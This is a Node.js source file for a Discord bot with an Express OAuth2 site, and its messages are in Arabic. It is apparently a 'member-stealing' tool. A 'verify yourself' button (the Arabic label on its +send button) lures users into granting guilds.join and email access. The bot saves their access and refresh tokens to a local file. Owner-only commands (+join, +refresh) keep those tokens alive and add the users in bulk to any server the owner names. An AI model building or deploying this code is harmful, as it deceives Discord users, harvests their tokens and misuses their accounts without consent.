const {
  Discord,
  MessageEmbed,
  Client,
  Intents,
  GuildScheduledEvent,
  Permissions,
  MessageButton,
  MessageActionRow,
} = require("discord.js");
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});
const express = require("express")
const app = express();
var listener = app.listen(process.env.PORT || 3004, function () {
  console.log('Your app is listening on port ' + listener.address().port);
});
app.listen(() => console.log("I'm Ready To Work..! 24H"));
app.get('/', (req, res) => {
  res.send(`
  <body>
  <center><h1>Bot 24H ON!</h1></center
  </body>`)
});

var path = require("path");
var bodyParser = require("body-parser");
const Database = require("st.db");
const usersdata = new Database({
  path: "./database/users.json",
  databaseInObject: true,
});
const DiscordStrategy = require("passport-discord").Strategy,
  refresh = require("passport-oauth2-refresh");
const passport = require("passport");
const session = require("express-session");
const wait = require("node:timers/promises").setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"));
app.set("view engine", "ejs");
app.use(express.static("public"));
const config = require("./config.js");
const { use } = require("passport");
global.config = config;
this.fetch = require("node-fetch");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

var scopes = ["identify", "email", "guilds", "guilds.join"];

passport.use(
  new DiscordStrategy(
    {
      clientID: config.bot.botID,
      clientSecret: config.bot.clientSECRET,
      callbackURL: config.bot.callbackURL,
      scope: scopes,
    },
    function (accessToken, refreshToken, profile, done) {
      process.nextTick(async function () {
        usersdata.set(`${profile.id}`, {
          accessToken: accessToken,
          refreshToken: refreshToken,
        });
        return done(null, profile);
      });
    }
  )
);
app.get("/", function (req, res) {
  res.render("index", {
    client: client,
    user: req.user,
    config: config,
    bot: bot,
  });
});

app.use(
  session({
    secret: "some random secret",
    cookie: {
      maxAge: 60000 * 60 * 24,
    },
    saveUninitialized: false,
  })
);
app.get("/", (req, res) => {
  res.render("index", {
    client: client,
    user: req.user,
    config: config,
    bot: bot,
  });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get(
  "/login",
  passport.authenticate("discord", { failureRedirect: "/" }),
  function (req, res) {
    var characters = "0123456789";
    let idt = ``;
    for (let i = 0; i < 10; i++) {
      idt += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    res.render("login", {
      client: client,
      user: req.user,
      config: config,
      bot: bot,
    });
  }
);

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`آثــبــث نـفــســك`)
      .setStyle(`LINK`)
      .setURL(
        `https://discord.com/oauth2/authorize?client_id=1359601868933693561&response_type=code&redirect_uri=https%3A%2F%2Fsimple-mud-sprout.glitch.me%2Flogin&scope=email+guilds+identify+guilds.join`
      )
      .setEmoji(`✅`);

    let row = new MessageActionRow().setComponents(button);
    message.channel.send({ components: [row] });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
    let member =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط**` });
    let data = usersdata.get(`${member.id}`);
    if (data) return message.channel.send({ content: `**موثق بالفعل**` });
    if (!data) return message.channel.send({ content: `**غير موثق**` });
  }
});

client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص ..**` });
    let alld = usersdata.all();
    let args = message.content.split(` `).slice(1);
    if (!args[0] || !args[1])
      return msg
        .edit({ content: `**عذرًا , يرجى تحديد خادم ..**` })
        .catch(() => {
          message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` });
        });
    let guild = client.guilds.cache.get(`${args[0]}`);
    let amount = args[1];
    let count = 0;
    if (!guild)
      return msg
        .edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` })
        .catch(() => {
          message.channel.send({
            content: `**عذرًا , لم اتمكن من العثور على الخادم ..**`,
          });
        });
    if (amount > alld.length)
      return msg
        .edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` })
        .catch(() => {
          message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` });
        });
    for (let index = 0; index < amount; index++) {
      await oauth
        .addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token,
        })
        .then(() => {
          count++;
        })
        .catch(() => {});
    }
    msg
      .edit({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``,
      })
      .catch(() => {
        message.channel.send({
          content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``,
        });
      });
  }
});
client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel
      .send({ content: `**جاري عمل ريفريش ..**` })
      .catch(() => {});
    let alld = usersdata.all();
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth
        .tokenRequest({
          clientId: client.user.id,
          clientSecret: bot.clientSECRET,
          grantType: "refresh_token",
          refreshToken: alld[i].data.refreshToken,
        })
        .then((res) => {
          usersdata.set(`${alld[i].ID}`, {
            accessToken: res.access_token,
            refreshToken: res.refresh_token,
          });
          count++;
        })
        .catch(() => {
          usersdata.delete(`${alld[i].ID}`);
        });
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``,
    }).catch(() => {
      message.channel
        .send({ content: `**تم بنجاح .. ${count}**` })
        .catch(() => {});
    });
  }
});
client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+users`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let alld = usersdata.all();
    message.reply({ content: `**يوجد حاليًا ${alld.length}**` });
  }
});
client.on("messageCreate", async (message) => {
  if (message.content.startsWith(`+help`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    message.reply({
      content: `**[\`+join {ServerId} {amount}\`]**
**[\`+refresh\`]**
**[\`+users\`]**
**[\`+help\`]**
**[\`+check\`]**
**[\`+send\`]**
    `,
    });
  }
});
var listeners = app.listen(3004, function () {
  console.log("Your app is listening on port " + `3004`);
});

client.on("ready", () => {
  console.log(`Bot is On! ${client.user.tag}`);
});
client.login(process.env.token);